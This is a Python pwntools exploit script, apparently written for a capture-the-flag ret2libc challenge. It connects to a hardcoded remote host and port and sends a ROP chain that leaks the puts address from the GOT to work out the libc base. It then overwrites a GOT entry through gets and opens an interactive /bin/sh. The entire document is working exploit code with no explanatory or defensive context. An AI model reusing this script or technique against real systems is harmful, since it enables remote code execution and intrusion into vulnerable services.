#!/usr/bin/python3

from pwn import *

p = remote("143.198.127.103", 42001)
e = ELF("./ret2libc")
#context.log_level = 'debug'

padding = "A"*0x28
pr = 0x000000000040155b
putsLibrary = 0x00000000000765f0

payload = padding.encode('utf-8')
payload += p64(pr)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(pr)
payload += p64(e.bss())
payload += p64(e.plt['gets'])
payload += p64(pr)
payload += p64(0x405018)
payload += p64(e.plt['gets'])
payload += p64(pr+1)
payload += p64(pr)
payload += p64(e.bss())
payload += p64(e.plt['puts'])

p.sendlineafter("[y/N]", payload)

p.recvline()
p.recvline()
p.recvline()
p.recvline()
puts = u64(p.recvuntil("\x7f").ljust(8, '\x00'.encode('utf-8')))
baseAddr = puts - putsLibrary

log.info("puts mapped address: " + hex(puts))
log.info("Library Base Address: " + hex(baseAddr))

p.sendline("/bin/sh\x00")
p.sendline(p64(baseAddr + 0x0000000000048e50 ))
p.interactive()
